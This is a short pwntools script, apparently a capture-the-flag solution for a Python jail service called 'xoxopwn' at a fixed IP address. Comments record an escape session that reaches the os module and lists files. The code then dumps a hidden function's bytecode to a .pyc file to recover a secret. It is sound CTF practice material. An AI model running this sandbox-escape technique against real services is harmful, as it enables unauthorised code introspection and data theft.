from pwn import *
"""
nc 178.128.12.234 10002

or

nc 178.128.12.234 10003
"""
# <function o at 0x7f19ed9ffc80>
# <function x at 0x7f19eda0d050>
# Type help() for interactive help, or help(object) for help about object.
# <built-in function all>
"""
This is function x()>>> quit
Use quit() or Ctrl-D (i.e. EOF) to exit


<module 'os' from '/usr/lib/python2.7/os.pyc'>


This is function x()>>> os.getcwd()
/home/xoxopwn

This is function x()>>> os.listdir("./")
['.profile', '.bash_logout', 'xoxopwn.py', '.bashrc']

finding secret in o()
"""
context.log_level = 'debug'
conn = remote("178.128.12.234", 10002)



x = 0x7f19eda0d050
o = 0x7f19ed9ffc80

conn.recvuntil("This is function x()>>>")
conn.sendline("o.func_code.co_code")
k = conn.recv(0x8d)

f = open("o_func.pyc",'w')
f.write(k)
f.close()


conn.interactive()




